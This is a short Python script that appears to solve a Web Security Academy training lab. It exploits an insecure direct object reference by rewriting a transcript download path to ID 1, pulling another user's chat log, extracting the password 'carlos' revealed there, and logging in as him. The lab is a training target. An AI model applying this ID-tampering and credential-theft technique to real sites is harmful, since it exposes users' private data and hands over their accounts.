from web_security_academy.core.logger import logger
import re


def solve_lab(session, *args):
    # File upload
    logger.info("Sending fake transcript file to '/download-transcript'...")
    files = {"transcript": (None, "")}
    resp = session.post_path("/download-transcript", files=files, allow_redirects=False)

    if resp.status_code != 302:
        logger.failure("Did not receive expected 302 status code.")
        return
    else:
        location = resp.headers["Location"]
        logger.success(f"Found redirect path: {location}")

    # IDOR
    path = re.sub(r"[0-9]+", "1", location)
    logger.info(f"Exploiting IDOR vulnerability by visiting '{path}'...")

    resp = session.get_path(path)
    if resp.status_code != 200:
        logger.failure("Unable to download transcript.")
        return
    else:
        logger.success("Downloaded the following transcript:")
        print(resp.text)

    password = re.search(f"my password is (.*)\.", resp.text).group(1)
    session.login("carlos", password)
